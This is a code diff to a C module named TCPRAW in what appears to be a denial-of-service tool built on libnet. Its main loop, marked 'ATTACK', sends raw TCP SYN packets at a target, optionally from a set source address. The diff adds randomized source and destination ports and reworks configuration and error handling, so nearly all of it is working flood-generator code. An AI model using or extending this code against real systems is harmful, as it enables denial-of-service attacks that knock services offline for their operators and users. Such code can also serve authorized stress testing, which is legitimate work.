@@ -75,7 +75,10 @@ static void tcpraw__thread(THREAD_WORK *tw)
 {
   TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
   unsigned int seq = libnet_get_prand(LIBNET_PRu32);
+  unsigned sport, dport;
   int i;
+
+  sport = dport = 1337;
 
   /* ATTACK */
   while(1)
@@ -89,12 +92,18 @@ static void tcpraw__thread(THREAD_WORK *tw)
     TDBG2("Sending %d packet(s)...", tc->npackets);
     for(i = 0; i < tc->npackets; i++)
     {
+      sport = tc->shost.port_defined
+                ? tc->shost.port
+                : NEXT_RAND_PORT(sport);
+      dport = tc->dhost.port_defined
+                ? tc->dhost.port
+                : NEXT_RAND_PORT(dport);
       seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
 /* XXX TODO: "Set flags" */
 /* XXX TODO: "Set window" */
       ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                         &tc->shost.addr.in.inaddr, sport,
+                         &tc->dhost.addr.in.inaddr, dport,
                          TH_SYN, 13337,
                          seq, 0,
                          (char *) tc->payload.data, tc->payload.size,
@@ -110,28 +119,32 @@ static void tcpraw__thread(THREAD_WORK *tw)
  *   configuration and reconfigurations.
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
+static int tcpraw__configure(THREAD_WORK *tw, SNODE *command, int first_time)
 {
   TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
 
   /* first initialization (specialized work thread data) */
-  if(tc == NULL)
+  if(first_time)
   {
-    if((tc = calloc(1, sizeof(TCPRAW_CFG))) == NULL)
-      TFAT("No memory for TCPRAW_CFG.");
-    tw->data = (void *) tc;
-
     /* initialize libnet */
+    TDBG("Initializing libnet.");
     if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
-      TFAT("No memory for LN_CONTEXT.");
+    {
+      TERR("No memory for LN_CONTEXT.");
+      return -1;
+    }
     ln_init_context(tc->lnc);
 
     pthreadex_timer_init(&(tc->timer), 0.0);
+    pthreadex_timer_name(&(tc->timer), "tcpraw-timer");
   }
 
   /* configure src address (if not defined) */
   if(tc->dhost.type == INET_FAMILY_NONE)
-    TFAT("I need a target address.");
+  {
+    TERR("I need a target address.");
+    return -1;
+  }
   if(tc->shost.type == INET_FAMILY_NONE)
   {
     DOS_ADDR_INFO *ai;
@@ -146,11 +159,17 @@ static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
 
   /* check params sanity */
   if(tc->pattern != TYPE_PERIODIC)
-    TFAT("Uknown pattern %d.", tc->pattern);
+  {
+    TERR("Uknown pattern %d.", tc->pattern);
+    return -1;
+  }
   if(tc->npackets < 0)
     TWRN("Bad number of packets %d.", tc->npackets);
   if(tc->hitratio < 0)
-    TFAT("Bad hit ratio '%f'.", tc->hitratio);
+  {
+    TERR("Bad hit ratio '%f'.", tc->hitratio);
+    return -1;
+  }
 
   /* configure timer */
   if(tc->hitratio > 0)
@@ -187,8 +206,6 @@ static void tcpraw__cleanup(THREAD_WORK *tw)
     free(tc->payload.data);
     tc->payload.data = NULL;
   }
-  free(tc);
-  tw->data = NULL;
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -222,9 +239,9 @@ static int cfg_cb_update_flags(TEA_OBJCFG *oc, THREAD_WORK *tw)
 TOC_BEGIN(tcpraw_cfg_def)
   TOC("dst_addr",       TEA_TYPE_ADDR,   1, TCPRAW_CFG, dhost,      NULL)
   TOC("dst_port",       TEA_TYPE_PORT,   0, TCPRAW_CFG, dhost,      NULL)
-  TOC("flags",          TEA_TYPE_STRING, 1, TCPRAW_CFG, flags,      cfg_cb_update_flags)
+  TOC("tcp_flags",      TEA_TYPE_STRING, 1, TCPRAW_CFG, flags,      cfg_cb_update_flags)
   TOC("pattern",        TEA_TYPE_INT,    1, TCPRAW_CFG, pattern,    NULL)
-  TOC("payload",        TEA_TYPE_DATA,   1, TCPRAW_CFG, payload,    NULL)
+  TOC("payload",        TEA_TYPE_DATA,   0, TCPRAW_CFG, payload,    NULL)
   TOC("periodic_ratio", TEA_TYPE_FLOAT,  1, TCPRAW_CFG, hitratio,   NULL)
   TOC("periodic_n",     TEA_TYPE_INT,    1, TCPRAW_CFG, npackets,   NULL)
   TOC("src_addr",       TEA_TYPE_ADDR,   0, TCPRAW_CFG, shost,      NULL)
@@ -233,6 +250,7 @@ TOC_END
 
 TEA_OBJECT teaTCPRAW = {
   .name         = "TCPRAW",
+  .datasize     = sizeof(TCPRAW_CFG),
   .configure    = tcpraw__configure,
   .cleanup      = tcpraw__cleanup,
   .listen_check = tcpraw__listen_check,
